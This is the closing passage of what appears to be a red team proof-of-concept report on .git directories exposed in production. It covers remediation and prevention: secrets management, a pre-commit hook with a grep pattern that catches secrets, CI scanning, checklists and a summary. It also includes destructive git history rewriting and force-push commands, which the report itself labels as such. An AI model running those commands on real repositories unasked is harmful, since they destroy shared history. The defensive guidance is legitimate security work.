DB_PASSWORD = os.environ.get('DB_PASSWORD') or get_secret('prod/db/password')

# Using AWS Secrets Manager:
import boto3
import json

def get_secret(secret_name):
    client = boto3.client('secretsmanager', region_name='ap-southeast-1')
    response = client.get_secret_value(SecretId=secret_name)
    return json.loads(response['SecretString'])

# Usage:
db_credentials = get_secret('prod/database/credentials')
DB_HOST = db_credentials['host']
DB_USER = db_credentials['username']
DB_PASSWORD = db_credentials['password']
```

#### Git Hygiene Best Practices

```bash
# 1. Use .gitignore properly
cat > .gitignore << 'EOF'
# Environment variables
.env
.env.*
*.env

# Configuration files with secrets
config/secrets.json
config/production.*
credentials.*

# Logs
*.log
logs/

# Dependencies
node_modules/
vendor/

# Build artifacts
dist/
build/

# IDE files
.vscode/
.idea/

# OS files
.DS_Store
Thumbs.db
EOF

# 2. Git hooks to prevent secret commits
cat > .git/hooks/pre-commit << 'EOF'
#!/bin/bash

# Check for potential secrets
if git diff --cached | grep -E "(password|api[_-]key|secret|token)\s*=\s*['\"]"; then
    echo "❌ ERROR: Potential secret detected in commit!"
    echo "Please remove secrets before committing."
    exit 1
fi

# Scan with gitleaks
if command -v gitleaks &> /dev/null; then
    gitleaks protect --staged --verbose
fi

exit 0
EOF

chmod +x .git/hooks/pre-commit

# 3. Clean existing git history (DESTRUCTIVE - use carefully!)
# Remove secrets from git history
git filter-repo --invert-paths --path config/secrets.json
git filter-repo --invert-paths --path .env

# 4. Force push cleaned history (coordinate with team!)
git push --force --all
```

---

## 📚 Phase 7: Prevention & Best Practices

### 7.1 Secure Deployment Checklist

```markdown
## Pre-Deployment Security Checklist

### Build Process
- [ ] Build artifacts from CI/CD only
- [ ] Exclude .git directory from deployment
- [ ] Remove .env files and secrets
- [ ] Run security scanners (npm audit, etc.)
- [ ] Verify no hardcoded credentials

### Web Server Configuration
- [ ] Block .git directory access
- [ ] Remove server version headers
- [ ] Implement security headers
- [ ] Configure WAF rules
- [ ] Enable HTTPS only

### Secrets Management
- [ ] All secrets in environment variables
- [ ] No secrets in source code
- [ ] Use secrets management service
- [ ] Implement secret rotation
- [ ] Audit secret access

### Monitoring & Logging
- [ ] Enable access logging
- [ ] Configure SIEM alerts
- [ ] Monitor for .git access attempts
- [ ] Set up anomaly detection
- [ ] Regular security reviews

### Access Control
- [ ] Production on isolated network
- [ ] Databases not publicly accessible
- [ ] VPN required for admin access
- [ ] Implement least privilege
- [ ] Regular access audits
```

### 7.2 Developer Security Training

```yaml
Training_Program:

  Module_1_Secure_Coding:
    topics:
      - Never commit secrets to git
      - Proper use of .gitignore
      - Environment variables for configuration
      - Input validation and sanitization

  Module_2_Git_Security:
    topics:
      - Git hooks for secret detection
      - Cleaning git history
      - Code review for security
      - Branch protection rules

  Module_3_Deployment_Security:
    topics:
      - Secure CI/CD pipelines
      - Artifact management
      - Production environment isolation
      - Incident response procedures

  Module_4_Threat_Modeling:
    topics:
      - Common attack vectors
      - Defense in depth
      - Security testing
      - Red team exercises
```

### 7.3 Automated Security Testing

```yaml
# .github/workflows/security-scan.yml

name: Security Scanning

on: [push, pull_request]

jobs:
  security-scan:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v3
        with:
          fetch-depth: 0  # Full history for better scanning

      # Secret scanning
      - name: Scan for secrets with GitLeaks
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      # Dependency vulnerabilities
      - name: Dependency audit
        run: npm audit --audit-level=moderate

      # Static code analysis
      - name: SonarCloud Scan
        uses: SonarSource/sonarcloud-github-action@master
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}

      # Container scanning
      - name: Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          scan-ref: '.'
          severity: 'CRITICAL,HIGH'

      # Fail on security issues
      - name: Check for critical findings
        run: |
          if [ -f security-report.json ]; then
            CRITICAL=$(jq '.critical' security-report.json)
            if [ "$CRITICAL" -gt 0 ]; then
              echo "❌ Critical security issues found!"
              exit 1
            fi
          fi
```

---

## 📈 Metrics & KPIs

### Security Metrics

```yaml
Measurement_Framework:

  Detection_Metrics:
    - Time to detect git exposure: < 1 hour
    - Alert false positive rate: < 5%
    - Coverage of security rules: 100%

  Response_Metrics:
    - Time to remediate git exposure: < 24 hours
    - Credential rotation time: < 4 hours
    - Incident response time: < 1 hour

  Prevention_Metrics:
    - Secrets in code: 0
    - Pre-commit hook usage: 100%
    - Security training completion: 100%
    - Vulnerability scan frequency: Daily

  Compliance_Metrics:
    - Deployment checklist compliance: 100%
    - Security reviews per sprint: ≥ 1
    - Penetration test frequency: Quarterly
    - Audit findings remediation: < 30 days
```

---

## 🎓 Conclusion

### Summary

This Proof of Concept demonstrates:

1. **Critical Risk:** Git directory exposure can lead to complete compromise
2. **Easy Exploitation:** Requires minimal skill and common tools
3. **Severe Impact:** $8.5M+ potential damages
4. **Simple Fix:** Can be remediated in < 1 hour

### Key Takeaways

```
╔════════════════════════════════════════════════════════╗
║  CRITICAL LESSONS                                      ║
╠════════════════════════════════════════════════════════╣
║                                                        ║
║  1. NEVER deploy .git to production                    ║
║  2. NEVER commit secrets to git repositories           ║
║  3. robots.txt is NOT a security control               ║
║  4. Implement defense in depth                         ║
║  5. Monitor for exploitation attempts                  ║
║  6. Regular security assessments are critical          ║
║  7. Automate security in CI/CD pipeline                ║
║  8. Train developers on secure practices               ║
║                                                        ║
╚════════════════════════════════════════════════════════╝
```

### Recommended Actions

**Immediate (24 hours):**
1. ✅ Block .git directory in web server config
2. ✅ Remove .git from production servers
3. ✅ Rotate ALL exposed credentials

**Short-term (1 week):**
4. ✅ Implement secure deployment pipeline
5. ✅ Deploy monitoring and detection
6. ✅ Security training for all developers

**Long-term (1 month):**
7. ✅ Implement secrets management solution
8. ✅ Automated security testing in CI/CD
9. ✅ Regular penetration testing program

---

## 📞 Contact & Resources

### Red Team Contact
- Email: redteam@aspi-security.or.id
- Emergency: +62-21-XXX-XXXX
- Slack: #security-red-team

### References
- [OWASP Git Security](https://owasp.org/www-community/vulnerabilities/Git_exposure)
- [CWE-540: Source Code Information Leak](https://cwe.mitre.org/data/definitions/540.html)
- [Git Security Best Practices](https://github.com/security/best-practices)

### Tools Used
- GitDumper: https://github.com/arthaud/git-dumper
- GitLeaks: https://github.com/gitleaks/gitleaks
- TruffleHog: https://github.com/trufflesecurity/trufflehog

---

**Report Classification:** CONFIDENTIAL - Red Team Use Only
**Distribution:** Security Team, Senior Management
**Retention:** 7 years per compliance requirements

**End of Red Team PoC Report**
